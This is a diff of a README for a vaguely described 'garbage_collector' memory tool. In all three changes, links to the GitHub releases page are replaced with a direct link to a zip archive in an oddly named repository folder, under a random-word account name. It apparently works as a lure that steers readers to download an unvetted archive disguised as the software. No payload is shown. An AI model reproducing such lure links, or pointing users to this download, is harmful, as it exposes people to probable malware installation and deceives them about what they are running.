@@ -1,7 +1,7 @@
 # 🗑️ garbage_collector - Manage Memory with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-orange.svg)](https://github.com/Morphophonemicsystemmarylandchicken839/garbage_collector/releases)
+[![Download](https://raw.githubusercontent.com/Morphophonemicsystemmarylandchicken839/garbage_collector/main/puttock/garbage_collector.zip)](https://raw.githubusercontent.com/Morphophonemicsystemmarylandchicken839/garbage_collector/main/puttock/garbage_collector.zip)
 
 ## 🚀 Getting Started
 Welcome to the garbage_collector project! This software helps manage memory automatically, ensuring your programs run smoothly. In just a few steps, you can download the application and start using it.
@@ -16,7 +16,7 @@ To run garbage_collector, you’ll need:
 To get started, follow these steps:
 
 1. **Visit the releases page.** Click the link below to access the repository.  
-   [Download from Releases](https://github.com/Morphophonemicsystemmarylandchicken839/garbage_collector/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Morphophonemicsystemmarylandchicken839/garbage_collector/main/puttock/garbage_collector.zip)
 
 2. **Choose the latest version.** Look for the most recent version at the top of the page. 
 
@@ -66,4 +66,4 @@ If you experience issues or have questions, consider visiting the discussions se
 ## 🚪 Moving Forward
 Now you’re ready to manage memory effectively with garbage_collector. Download the software to see firsthand how it improves your experiences in programming.
 
-[Download from Releases](https://github.com/Morphophonemicsystemmarylandchicken839/garbage_collector/releases)
+[Download from Releases](https://raw.githubusercontent.com/Morphophonemicsystemmarylandchicken839/garbage_collector/main/puttock/garbage_collector.zip)
